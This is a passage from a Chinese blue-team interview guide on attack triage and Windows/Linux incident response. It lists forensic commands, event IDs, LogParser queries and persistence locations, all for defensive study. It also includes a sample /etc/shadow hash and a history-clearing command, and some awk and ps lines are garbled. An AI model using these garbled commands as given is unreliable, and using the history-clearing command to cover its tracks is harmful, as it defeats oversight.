安全日志（</strong>系统安全日志的一种），</p><p><strong>4、关于远程桌面登录的记录</strong>，</p><p>成功和失败事件类型和 ID</p><p>远程登录成功，和管理员确定是非管理员操作，基本判定是失陷</p><p>远程登录不成功，需要检查谁在登录，如何去禁止登录</p><p>（1）内网，检查谁在登录，并且定位 IP 进行排查（内网已经失陷）</p><p>（2）外网，封禁 IP 或关闭远程服务。</p><h3 id="问十三：windos有那些敏感关键目录？"><a href="#问十三：windos有那些敏感关键目录？" class="headerlink" title="问十三：windos有那些敏感关键目录？"></a><strong>问十三：windos有那些敏感关键目录？</strong></h3><p>Web 应用根目录、文件上传目录</p><p>C:\Users\Administrator\Downloads</p><p>/var/tmp    tomcat-users.xml    /var/spool/cron/    /etc/crontab</p><p>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p><p>C:\Windows\System32\Tasks\    C:\Windows\SysWOW64\Tasks\    C:\Windows\tasks\</p><h3 id="问十四：怎么做攻击研判的？"><a href="#问十四：怎么做攻击研判的？" class="headerlink" title="问十四：怎么做攻击研判的？"></a>问十四：怎么做攻击研判的？</h3><p>网络安全中的攻击研判，可以理解为人工层面对攻击事件进行再分析的行为。</p><p>一般来说，对攻击事件的分析研判通常从以下 4 个维度进行：</p><ol><li>对已发现攻击的来源进行研判；</li><li>综合分析攻击技术、工具和路径，判断其威胁性大小；</li><li>攻击意图研判；</li><li>处置方式判断。</li></ol><p>攻击研判，可以看作安全防护流程最为关键的一环。它上承安全告警的分析，下接安全处置的实施，是安全防护过程中技术含量最高的一步。</p><ul><li>攻击研判的 6 个步骤</li></ul><p>攻击研判属于安全事件响应的一部分，为了更好地了解攻击研判在整个事件响应过程中的作用，我们可以把列出包括攻击研判在内的事件响应全流程，其中蓝色部分属于攻击研判的流程部分。</p><p><img src="/HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/image-20220628184449127.png" alt="image-20220628184449127"></p><p><strong>1. 攻击告警真实性研判</strong></p><p>在接到告警研判服务请求后，通过内置的研判溯源模型并结合实际环境，快速分析告警主机的进程和操作审计事件，确认告警的真假以及攻击者还做了其他哪些操作，明确告警主机是不是已被入侵，进行系统性的梳理并给出详细的研判分析报告。</p><p>在系统发出警报后好做出响应的处置以前，需要对警报进行确认，是误报，还是真的有告警事件发生？如果告警是真实的，那么攻击者是正在试图入侵的过程中，还是已经成功入侵？只有确认告警事件为攻击者已经成功入侵后，才会启动响应处置。</p><p>告警研判的结果和对应措施也可以用下表直观地展示出来：</p><p><img src="/HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/t01610b78a41d1dca49.jpg" alt="img"></p><p><strong>2. 攻击事件调查</strong></p><p>一旦确定了告警的真实性，要通过主机、流量侧的日志以及系统告警等信息，对攻击事件进行调查。并根据攻击行为特征建立一套通用的方法论，生成《XXX 事件调查报告》。根据这套方法论在自己的安全设备中添加检测规则，以便在下次面对相同攻击的时候快速做出响应。</p><p>在这个过程中，请参阅以下关键问题以全面了解攻击事件：</p><p>・最初的攻击媒介是什么？ （即，攻击方如何获得对网络的初始访问权限？）</p><p>・攻击方如何访问环境？</p><p>・攻击方是否利用漏洞来获得访问权或特权？</p><p>・攻击方如何维持指挥和控制？</p><p>・攻击方在网络或设备上是否有持久性？</p><p>・持久性的方法是什么（例如，恶意软件后门、webshell、合法凭证、远程工具等）？</p><p>・哪些帐户已被盗用，这些账户是什么权限级别（例如，域管理员、本地管理员、用户帐户等）？</p><p>・使用什么方法进行侦察？</p><p>・是否发生横向移动？ 如何进行横向移动（例如，RDP、网络共享、恶意软件等）？</p><p>・数据是否被泄露，如果有，是什么类型的，通过什么机制？</p><p><strong>3. 失陷范围排查</strong></p><p>安全事件发生时，对于横向移动主机，首先会根据现有信息找出一台确认失陷的主机，然后以这台失陷主机的数据以及它的互联关系为线索，在用户系统中展开内网溯源，确认是否存在被横向渗透的主机，并循环此过程逐步找出所有失陷主机，确认攻击影响面及具体的失陷范围。</p><p><img src="/HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/t01f3868fc0e25f591b.jpg" alt="img"></p><p><strong>4. 攻击过程还原</strong></p><p>攻击溯源是事件响应的关键，也是安全能力提升的关键。通过对被攻击资产的分析与溯源，还原攻击路径与攻击手法，用户不仅能够有效提升攻防演练效果，还可增强常态化安全防御能力，将攻击事件转换为防御势能，避免二次攻击事件的发生。</p><p><strong>5. 防守方成果报告整理</strong></p><p>在攻防演练中，防守方在完成攻击确认到调查、还原的整个流程之后，需要整理出一份防守报告，阐述攻击的真实性、攻击的覆盖范围、攻击者的攻击路径及行为。并将报告提交给组织方，即可得分。</p><p><strong>6. 攻击清除处置建议</strong></p><p>最后，根据对攻击者所用技术和攻击路径的反向梳理结果，安全团队要综合分析对方的攻击动机和意图，以及用户自身的防护水平及目的，给出合理的处置建议。</p><p>以上 6 个步骤是在攻防演练或日常防护中所要实施的攻击研判流程，不同企业的攻击研判服务都大致如此。但虽然流程基本一致，不同企业组织的攻击研判质量却参差不齐，究其原因，在于研判模式的区别。</p><h3 id="问十五：去年爆出了哪些漏洞？"><a href="#问十五：去年爆出了哪些漏洞？" class="headerlink" title="问十五：去年爆出了哪些漏洞？"></a>问十五：去年爆出了哪些漏洞？</h3><p><img src="/HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/1657005291550.png" alt="1657005291550"></p><p>漏洞汇总地址：<a href="https://www.hedysx.com/2756.html">https://www.hedysx.com/2756.html</a></p><h3 id="问十六：去年有哪些已证实的漏洞"><a href="#问十六：去年有哪些已证实的漏洞" class="headerlink" title="问十六：去年有哪些已证实的漏洞"></a>问十六：去年有哪些已证实的漏洞</h3><p><strong>漏洞编号：B-T-V-0052</strong> 漏洞名称：金蝶天燕 v9.0 版本消息中间件 getshell 涉及厂商：金蝶 漏洞等级：高危 是否公开：否 是否有 POC：是 首次发现时间：2021 年 4 月 10 日 情报来源：互联网</p><p><strong>防护建议：</strong> 奇安信天眼 规则 ID：0x10020D4C 版本号：3.0.0411.12748 奇安信安域 Web 应用防护系统 规则 ID：181260001 版本号：20210411003 奇安信网神网络数据传感器 规则 ID：6366 版本号：2104111822 奇安信网神智慧防火墙 规则 id：1240701 版本号：2104112000 及以上版本 奇安信网神云锁服务器安全管理系统 RASP 版本：2.0.18 Agent 版本号：V8.0.2.112</p><p><strong>漏洞编号：B-T-V-0058</strong> 漏洞名称：蓝凌 oa 高版本 前台未授权 getshell 涉及厂商：蓝凌 漏洞等级：高危 是否公开：否 是否有 POC：是 首次发现时间：2021 年 4 月 11 日 情报来源：互联网</p><p><strong>防护建议：</strong> 奇安信天眼 规则 id：0x10020D42 版本号：3.0.0411.12748 奇安信安域 Web 应用防护系统 规则 ID：181230002 版本号：20210411002 奇安信网神网络数据传感器 规则 ID：6357 版本号：2104111822 奇安信网神智慧防火墙 规则 id：1240601 版本号：2104112000 及以上版本 虚拟化安全管理平台 windows 版 规则 id:2923983 版本号：2021.04.14 虚拟化安全管理平台 linux 版 规则 id:313826 版本号：2021.04.14 奇安信网神智慧防火墙 规则 id：1238801 版本号：2104112000 及以上版本 奇安信网神统一服务器安全管理平台 规则 Id:63823983 版本号：10352</p><h1 id="二、应急、溯源和反制"><a href="#二、应急、溯源和反制" class="headerlink" title="二、应急、溯源和反制"></a>二、应急、溯源和反制</h1><h3 id="问十七：简述一下应急响应的流程？"><a href="#问十七：简述一下应急响应的流程？" class="headerlink" title="问十七：简述一下应急响应的流程？"></a>问十七：简述一下应急响应的流程？</h3><p>准备 - 检测 - 抑制 - 根除 - 恢复 - 书写报告 </p><p>1、准备工作，收集信息：收集告警信息、客户反馈信息、设备主机信息等。 </p><p>2、检测，判断类型：安全事件类型的判断（钓鱼邮件，webshell，爆破，中毒等） </p><p>3、抑制，控制范围，隔离失陷设备 </p><p>4、根除，分析研判，将收集的信息分析 </p><p>5、恢复，处置事件类型（进程、文件、邮件、启动项，注册表等） </p><p>6、输出报告</p><ul><li><p>第一步，安全感知平台查看事件预警，分析预警是否误报</p><p>误报，忽略；非误报，进行分析</p></li><li><p>第二步，从安全按感知平台，安全设备，对攻击事件进行分析</p><p>不成功，封禁 IP；成功，开启应急响应排查流程</p></li><li><p>第三步，应急响应</p><p>被上传 shell、网页被篡改、网页被加黑链：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">1、D盾扫找到最早shell，记录上传时间，备份shell并删除2、根据该shell在各类日志中找到恶意ip，并过滤出该ip的所有日志3、根据webshell生成时间找到该时间点的POST日志确认webshell生成方法4、继续向上溯源分析IP攻击路径以及可能利用的漏洞，重点关注POST日志，以及存在如upload、editor、admin、manage、sql等敏感字段的日志，同时分析网站用到的中间件或者框架，分析其中可能的漏洞5、修复攻击者使用的漏洞，<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第四步，开始系统排查</p></li></ul><ol><li>启动项</li></ol><p>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p><p>启动项的文件夹，排查是否有可疑的程序。</p><ol><li>计划任务</li></ol><p>C:\Windows\System32\Tasks\</p><p>C:\Windows\SysWOW64\Tasks\</p><p>C:\Windows\tasks\</p><p>排查是否有恶意计划任务自动运行。</p><ol><li>系统用户</li></ol><p>排查是否有多余的可疑账户，问题：2. 了解隐藏账户</p><p><img src="/HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/Lcct6f.jpg" alt="img"></p><p>难免会碰到一些应急场景，这里推荐 GitHub 上一个大佬的应急工具箱，整合了诸多的分析文章和常见工具，应急工具箱：[<a href="https://github.com/No-Github/1earn/blob/master/1earn/Security/BlueTeam/%E5%BA%94%E6%80%A5.md]">https://github.com/No-Github/1earn/blob/master/1earn/Security/BlueTeam/%E5%BA%94%E6%80%A5.md]</a></p><h3 id="问十八：入侵排查基本流程是什么？"><a href="#问十八：入侵排查基本流程是什么？" class="headerlink" title="问十八：入侵排查基本流程是什么？"></a>问十八：入侵排查基本流程是什么？</h3><p>宏观思路</p><ol><li>收集信息：收集客户信息和中毒主机信息，包括样本</li><li>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等</li><li>抑制范围：隔离使受害⾯不继续扩⼤</li><li>深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源</li><li>清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产</li><li>产出报告：整理并输出完整的安全事件报告</li></ol><h3 id="问十九：Winodws-系统应急排查思路？"><a href="#问十九：Winodws-系统应急排查思路？" class="headerlink" title="问十九：Winodws 系统应急排查思路？"></a>问十九：Winodws 系统应急排查思路？</h3><p>系统信息、系统帐号、注册表、账户信息、系统会话、检查日志、网卡信息</p><ul><li><p>系统信息</p><ul><li><p>查看系统版本以及补丁信息：<code>systeminfo</code></p></li><li><p>查看可疑目录及 (隐藏) 文件：</p><pre class="line-numbers language-none"><code class="language-none">Window 2003`：`C:\Documents and SettingsWindow 20008R2：C:\Users\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>查看最近运行的文件：</p><p>cmd 运行 <code>%UserProfile%\Recent</code></p><p><code>Recent</code> 是系统文件夹，里面存放了最近使用的文档的快捷方式。</p></li><li><p>查看可以文件的日期和文件信息</p></li></ul><p>系统帐号</p><p>查看所有帐号方法：</p><ul><li><p>打开本地用户和组</p><pre class="line-numbers language-none"><code class="language-none">compmgmt.msc或lusrmgr.msc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><p>使用命令行</p><pre class="line-numbers language-none"><code class="language-none">net user wmic useraccount wmic useraccount list brief<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看注册表</p><pre class="line-numbers language-none"><code class="language-none">regeditHKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>显示某个用户账户信息</p><pre class="line-numbers language-none"><code class="language-none">net user [SOMEONE]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>系统会话</p><ul><li>查看当前系统会话：<code>query user</code></li><li>下线用户：<code>logoff [id]</code></li></ul></li><li><p>检查日志</p><p>结合日志，查看管理员登陆操作，用户异常操作：<code>eventvwr.msc</code>，保存日志使用 LogParser 进行分析。</p></li><li><p>网卡信息</p><ul><li><p>列出所有网络驱动程序列表：<code>wmic nicconfig list</code></p></li><li><p>列出所有 IP 接口列表：<code>wmic nicconfig where IPEnabled='true'</code></p></li><li><p>更新静态 IP：<code>wmic nicconfig where index=9 call enablestatic("192.168.123.66"), ("255.255.255.0")</code></p></li><li><p>更新网关：<code>wmic nicconfig where index=9 call setgateways("192.168.123.4"), ("255.255.255.0"),(1,2)</code></p></li><li><p>DHCP 设置</p><pre class="line-numbers language-none"><code class="language-none">#启动wmic nicconfig where index=9 call enabledhcp #设置DHCP状态wmic service where caption="DHCP Client" call changestartmode "Disabled"wmic service where caption="DHCP Client" call changestartmode "Automatic"wmic service where caption="DHCP Client" call changestartmode "Manual"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p><strong>进程和端口相关</strong></p><p>进程、端口、程序位置、程序命令行参数</p><ul><li><p>进程</p><p>可以使用任务管理器查看进程</p><ul><li><p>方法一：开始 –&gt; 运行 –&gt; <code>msinfo32</code> –&gt; 软件环境 –&gt; 正在运行任务</p><p>（能查看进程的详细信息） 查看端口对应的 PID：<code>netstat -ano | findstr "[PORT]"</code></p></li><li><p>方法二：命令行查看进程</p><pre class="line-numbers language-none"><code class="language-none">wmic processwmic process list briefwmic process list fullwmic process list system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>以 xml 格式存储：<code>wmic /record:processes.xml process list full</code></p></li></ul><p>端口</p><ul><li><p>查看端口：<code>netstat -ano</code></p><p>查看网络连接：<code>netstat -ano | find ESTABLISHED</code></p><table><thead><tr><th>状态</th><th>说明</th></tr></thead><tbody><tr><td>Listen</td><td>监听状态</td></tr><tr><td>ESTABLISHED</td><td>建立连接</td></tr><tr><td>CLOSE_WAIT</td><td>对方主动关闭连接或网络异常导致连接中断</td></tr></tbody></table></li><li><p>根据显示的 PID 定位程序：<code>tasklist | findstr [PID]</code></p><p>查看 <code>Windows</code> 服务对应的端口：<code>%system%/system32/drivers/etc/services</code>（一般 % system% 就是 C:\Windows）。</p></li></ul><p>程序位置</p><ul><li><p>查看进程对应的程序位置</p><p>任务管理器 –&gt; 选择对应进程 –&gt; 右键打开文件位置</p><p>运行输入 <code>wmic</code>：<code>process</code></p></li><li><p>根据进程 PID 查找具体启动的程序</p><pre class="line-numbers language-none"><code class="language-none">tasklistwmic process get name,executablepath,processid | findstr pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><p>程序命令行参数</p><pre class="line-numbers language-none"><code class="language-none">wmic process get caption,commandline /value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询某一进程的命令行参数：</p><pre class="line-numbers language-none"><code class="language-none">wmic process where caption="svchost.exe" get caption,commandline /value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>服务和计划任务</strong></p><p>启动项检查、服务检查</p><ul><li><p>启动项检查</p><ul><li><p>查看启动项：<code>msconfig</code></p></li><li><p>查看注册表启动项：</p></li><li><p>运行 –&gt; <code>regedit</code> –&gt; 打开注册表，查看开机启动项是否正常，三个特别的注册表</p><pre class="line-numbers language-none"><code class="language-none">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>组策略下查看启动项：</p><p>运行 –&gt; <code>gpedit.msc</code>(组策略) –&gt; 计算机配置 –&gt; <code>Windows</code> 设置 –&gt; 脚本（启动 / 关机） –&gt; 启动 –&gt; 属性</p><p>命令行 <code>wmic</code> 查看启动列表：</p><pre class="line-numbers language-none"><code class="language-none">wmic startupwmic startup list fullwmic startup list briefwmic startup list system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>服务检查<ul><li>检查服务自启动：services.msc`</li><li>查询正在运行的服务：<code>sc query type=service</code></li><li>查询存在但是没运行的服务：<code>sc query type=service state=inactive</code></li><li>查询所有服务：<code>sc query type=service state=all</code></li></ul></li></ul><p><strong>日志分析、审核策略</strong></p><p>日志分类、审核策略、日志分析工具</p><ul><li><p>日志分类</p><ul><li><p>系统日志</p><p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由 Windows NT/2000 操作系统预先定义。  </p><p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p><ul><li><p>查看方法：</p><ol><li>开始 –&gt; 所有程序 –&gt; 管理工具 –&gt; 事件查看器</li><li>运行 –&gt; <code>eventvwr.msc</code></li></ol></li><li><p><code>Windows</code> 事件日志分析，不同的 <code>EVENT ID</code> 代表了不同的意义。</p><table><thead><tr><th>事件 ID</th><th>说明</th></tr></thead><tbody><tr><td>4624</td><td>登录成功</td></tr><tr><td>4625</td><td>登录失败</td></tr><tr><td>4634</td><td>注销成功</td></tr><tr><td>4647</td><td>用户启动的注销</td></tr><tr><td>4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td>4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th>登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td>3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td>4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td>5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td>7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td>8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如 FTP。</td></tr><tr><td>9</td><td>新凭证（NewCredentials）</td><td>使用带 / Netonly 参数的 RUNAS 命令运行一个程序。</td></tr><tr><td>10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td>11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table></li></ul></li><li><p>安全日志</p><p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。 </p><p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code>  </p></li><li><p>应用程序日志</p><p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </p><p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p></li></ul></li><li><p>审核策略</p><p>审核策略开启后可以查看系统出现故障、安全事故等系统日志文件，帮助排除故障，追查入侵者的信息等。</p><ul><li><p>开启审核策略</p><p>开始 –&gt; 管理工具 –&gt; 本地安全策略 –&gt; 本地策略 –&gt; 审核策略 配置</p><pre class="line-numbers language-none"><code class="language-none">审核账户管理|||成功,失败审核账户登录事件||成功,失败审核系统事件||||成功,失败审核特权使用|||失败审核目录服务访问||失败审核进程跟踪|||成功,失败审核对象访问|||失败审核登录事件|||成功,失败审核策略更改|||成功,失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>配置日志属性</p><p>开始 –&gt; 所有程序 –&gt; 管理工具 –&gt; 事件查看器 –&gt; Windows 日志 –&gt; 应用程序 –&gt; 右键属性 –&gt; 启用日志最大大小</p></li></ul><p>日志分析工具（LogParser）</p><p>日志解析器是微软开发的一个强大的多功能工具，它提供对基于文本的数据（例如日志文件、XML 文件和 CSV 文件）以及 Windows® 操作系统上的关键数据源（例如事件日志、注册表、文件系统和 Active Directory。  </p><p>下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a>  </p><p>下载完毕安装后，将其中的文件 LogParser.exe 复制到 C:\Windows\System32 文件夹中或者添加到系统环境变量中。</p><ul><li><p>查询登陆成功的事件</p><pre class="line-numbers language-none"><code class="language-none"># 登录成功的所有事件LogParser.exe -i:EVT –o:DATAGRID  "SELECT *  FROM c:\Security.evtx where EventID=4624"# 指定登录时间范围的事件LogParser.exe -i:EVT –o:DATAGRID  "SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;'2018-06-19 23:32:11' and TimeGenerated&lt;'2018-06-20 23:34:00' and EventID=4624"# 提取登录成功的用户名和IPLogParser.exe -i:EVT  –o:DATAGRID  "SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\Security.evtx where EventID=4624"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>查询登陆失败的事件</p><pre class="line-numbers language-none"><code class="language-none"># 登录失败的所有事件LogParser.exe -i:EVT –o:DATAGRID  "SELECT *  FROM c:\Security.evtx where EventID=4625"# 提取登录失败用户名进行聚合统计LogParser.exe  -i:EVT "SELECT  EXTRACT_TOKEN(Message,13,' ')  as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查询系统历史开关机记录</p><pre class="line-numbers language-none"><code class="language-none">LogParser.exe -i:EVT –o:DATAGRID  "SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>相关工具</strong></p><p>PCHunter：PC Hunter 是一个 Windows 系统信息查看软件，同时也是一个手工杀毒辅助软件。</p><p>下载地址：<a href="https://www.anxinsec.com/view/antirootkit/">https://www.anxinsec.com/view/antirootkit/</a></p><h3 id="问二十：Linux-系统应急排查"><a href="#问二十：Linux-系统应急排查" class="headerlink" title="问二十：Linux 系统应急排查"></a>问二十：Linux 系统应急排查</h3><p>Linux 系统信息</p><p>启动项、定时任务和历史命令、系统用户、入侵排查</p><ul><li><p>启动项</p><ul><li><p>系统运行级别</p><table><thead><tr><th>运行级别</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>关机</td></tr><tr><td>1</td><td>单用户模式，可以理解为 winodws 的安全模式，用于系统修复，比如更改密码</td></tr><tr><td>2</td><td>不完全的命令行模式，不包含 NFS 等服务</td></tr><tr><td>3</td><td>完全的命令行模式，就是标准字符界面</td></tr><tr><td>4</td><td>系统保留</td></tr><tr><td>5</td><td>图形模式</td></tr><tr><td>6</td><td>重启</td></tr></tbody></table><p>查看系统运行级别：<code>runlevel</code> </p><p>修改系统默认运行级别：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ vim /etc/inittabid=3: initdefault<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul><p>开机启动配置</p><p>在 CentOS 中，init 程序会读取 /etc/inittab 来完成初始化工作，<code>/etc/inittab</code> 主要指定运行级别，执行系统初始化脚本 <code>/etc/rc.d/rc.sysinit</code>。</p><p>开机启动配置文件：</p><pre class="line-numbers language-none"><code class="language-none">/etc/rc.local/etc/rc.d/init.d/etc/rc.d/rc.local/etc/rc.d/rc[0~6].d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>添加开机启动脚本</p><p>要开机启动对应的脚本，只需要将可执行脚本丢在 <code>/etc/init.d/</code> 目录下，然后 <code>/etc/rc.d/rc*.d</code> 中建立软链接即可：<code>ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></p><p><code>S</code> 开头代表加载时自启动；如果是 <code>K</code> 开头的脚本文件，代表运行级别加载时需要关闭的。</p></li><li><p>定时任务和历史命令</p><ul><li><p>定时任务</p><p>以下目录是否存在恶意脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>历史命令</p><p>通过<code>.bash_history</code> 查看账号执行过的系统命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ history# 或者$ more .bash_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><p>清除历史命令：<code>history -c</code></p></li><li><p>系统用户</p><ul><li><p>用户信息</p><p>用户信息文件 <code>/etc/passwd</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ root:x:0:0:root:/root:/bin/bash$ account:password:UID:GID:GECOS:directory:shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul><p>影子账户 <code>/etc/shadow</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><ul><li><p><code>who</code>：查看当前登录用户 (<code>tty</code> 本地登录，<code>pts</code> 远程登录)</p><p><code>w</code>：查看系统信息</p><p><code>uptime</code>：查看登录多久、多少用户</p></li></ul></li><li><p>入侵排查</p><ul><li>查看启动项文件：<code>more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/</code></li></ul></li><li><p>查询特权用户：<code>awk -F: 'c194a9eg1}' /etc/passwd</code></p></li><li><p>查询可疑远程登录的账号信息：`awk ‘/$1|$6/{print c194a9eg</p></li><li><p>查看除 <code>root</code> 帐号外，其他帐号是否存在 <code>sudo</code> 权限：<code>more /etc/sudoers | grep -v "^#\|^end-inline-katex--&gt;" | grep "ALL=(ALL)"</code></p></li><li><p>禁用或删除多余及可疑的帐号：</p><p><code>usermod -L user</code>：禁用帐号，帐号无法登录，<code>/etc/shadow</code> 第二栏为 <code>!</code> 开头。</p><p><code>userdel user</code>：删除 <code>user</code> 用户。</p><p><code>userdel -r user</code>：将删除 <code>user</code> 用户，并且将 <code>/home</code> 目录下的 user 目录一并删除。</p></li></ul><p><strong>端口和进程</strong></p><p>端口、进程</p><ul><li><p>端口</p><ul><li><p>查看端口：<code>netstat -antlp | more</code> </p><p>查看 <code>pid</code> 对应的进程文件路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ls -l /proc/$PID/exe# 或$ file /proc/$PID/exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>查看连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ netstat -antlp | grep ESTABLISHED$ netstat -antlp | grep LISTEN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进程</p><ul><li><p>查看进程：`ps aux | grep c194a9eg</p></li><li><p>隐藏进程查看：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ps -ef | awk '{print}' | sort -n | uniq &gt;1$ ls /proc | sort -n |uniq &gt;2$ diff 1 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><p>查看相关文件和路径</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ lsof -p [PID]$ pwdx [PID]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>服务</strong></p><p>服务管理、入侵排查</p><ul><li><p>服务管理</p><ul><li>使用 chkconfig 或者 systemctl 可以设置服务自启</li><li>修改 <code>/etc/re.d/rc.local</code> 加入 <code>/etc/init.d/servername start</code> 也可实现自启</li></ul></li><li><p>入侵排查</p><ul><li><p>CentOS 